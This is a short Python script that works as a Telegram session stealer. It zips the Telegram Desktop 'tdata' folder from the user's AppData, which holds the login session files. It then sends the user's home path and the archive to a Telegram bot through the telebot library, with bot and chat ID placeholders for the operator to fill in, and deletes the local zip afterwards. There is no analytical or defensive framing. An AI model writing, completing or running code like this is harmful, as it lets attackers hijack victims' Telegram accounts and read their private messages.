import os
import os.path
import shutil
import glob
import time
import telebot
from datetime import time
from datetime import datetime
from zipfile import ZipFile

pathusr = os.path.expanduser('~')

now = datetime.now()
name_archive = str(now.strftime("_%d_%m_%y_%I_%M"))

tdata_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\'
tdata_session_zip = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\' + name_archive + ".zip"

with ZipFile(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\session.zip','w') as zipObj:
   for folderName, subfolders, filenames in os.walk(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata'):
       for filename in filenames:
           if (filename != "working") & (filename !="binlog") :
                filePath = os.path.join(folderName, filename)
                zipObj.write(filePath)



old_file = os.path.join(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\', 'session.zip')
new_file = os.path.join(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\' , name_archive + ".zip")
os.rename(old_file, new_file)

#enter your id 
botid = 'yourtgbotid'
tgid = yourtgid

bot = telebot.TeleBot(botid)
bot.send_message(tgid, pathusr)
print("Loading files...")
bot.send_document(tgid,open(tdata_session_zip, 'rb'))

os.remove(tdata_session_zip)


